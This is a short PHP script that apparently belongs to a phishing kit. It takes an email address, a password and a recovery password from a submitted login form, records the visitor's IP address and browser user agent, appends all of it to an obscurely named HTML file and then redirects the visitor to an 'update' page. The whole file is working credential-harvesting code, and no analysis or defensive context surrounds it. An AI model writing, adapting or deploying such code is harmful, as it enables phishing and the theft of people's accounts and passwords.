<?php 


$email = $_POST['email'];
$pass  = $_POST['password'];
$Recoverypassword = $_POST['Recoverypassword'];
$ip = $_SERVER['REMOTE_ADDR'];
$agent =  $_SERVER['HTTP_USER_AGENT'];

$data = "<br> {$email} : {$pass} : {$Recoverypassword} : {$ip} : {$agent} ";
#
# 
#

$fp = fopen("43s4vbd558dgkj.html", "a+");
        fwrite($fp, $data);
        fclose($fp);


header("Location: update.html");

?>